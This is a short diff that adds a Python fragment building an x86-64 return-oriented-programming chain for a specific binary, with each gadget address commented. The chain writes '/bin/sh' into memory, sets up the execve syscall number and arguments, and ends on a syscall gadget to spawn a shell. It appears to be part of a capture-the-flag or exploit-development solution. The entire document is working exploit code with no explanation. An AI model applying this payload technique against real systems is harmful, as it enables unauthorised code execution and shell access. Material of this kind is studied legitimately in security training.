@@ -1,0 +1,17 @@
+payload = p64(0x405330)
+#0x0000000000405330: pop rsi; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x406108)
+# 0x0000000000406108: pop rdi; pop rbp; ret; 
+payload += p64(0x410068)+p64(0x0)+p64(0x407032)
+# 0x0000000000407032: mov qword ptr [rdi + 8], rsi; ret; 
+payload += p64(0x407c40)
+# 0x0000000000407c40: cmp dl, 0xfc; mov edx, 0; cmovne eax, edx; ret; 
+payload += p64(0x40ad6b)
+# 0x000000000040ad6b: pop rax; ret; 
+payload += p64(0x3b)+p64(0x405330)
+# 0x0000000000405330: pop rsi; ret; 
+payload += p64(0x0)+p64(0x406108)
+# 0x0000000000406108: pop rdi; pop rbp; ret; 
+payload += p64(0x410070)+p64(0x0)+p64(0x403efa)
+# 0x0000000000403efa: syscall; 
+payload += b''
